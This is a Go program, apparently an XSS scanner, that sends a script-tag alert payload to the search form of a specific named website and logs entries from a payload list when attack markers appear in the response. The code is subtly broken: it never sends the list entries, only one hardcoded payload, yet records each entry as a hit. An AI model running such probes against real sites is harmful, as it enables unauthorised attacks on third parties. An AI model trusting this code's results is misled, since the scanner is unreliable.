package main

import (
	"bytes"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"github.com/levigross/grequests"
	"io/ioutil"
	"log"
	"os"
	"strings"
)


var xss=[]string{"script","iframe","alert","xss","XSS"}
func main(){
	b, e := ioutil.ReadFile("./xss_scan/payload/xss-payload-list.html")
	if e != nil {
		fmt.Println("read file error")
		return
	}
	payloads:=bytes.Split(b,[]byte("\n"))
	for _,payload:=range payloads{
		resp, err := grequests.Post("http://www.lotuspen.com/search.html",
			&grequests.RequestOptions{
				Data: map[string]string{"keyword":string(`<script\x20type="text/javascript">javascript:alert(1);</script>`),"Submit":"","ot":"1"},
			})
		if err != nil {
			tracefile("err.txt",fmt.Sprintf("%s",err))
			continue
		}
		if resp.Ok != true {
			tracefile("err.txt",fmt.Sprintf("%s",err))
			continue
		}
		dom,err:=goquery.NewDocumentFromReader(resp)
		if err!=nil{
			log.Fatal(err)
		}
		dom.Find("#mid").Each(func(i int, selection *goquery.Selection) {
			res,err:=selection.Find("font[class=f_red]").Html()
			if err!=nil{
				log.Println(err)
			}
			for _,y:=range xss{
				if strings.Contains(res,y){
					tracefile("result.txt",string(payload))
				}
			}
		})
	}
}
func tracefile(filename,str_content string)  {
	fd,_:=os.OpenFile(filename,os.O_RDWR|os.O_CREATE|os.O_APPEND,0644)
	fd_content:=strings.Join([]string{str_content,"\n"},"")
	buf:=[]byte(fd_content)
	fd.Write(buf)
	fd.Close()
}
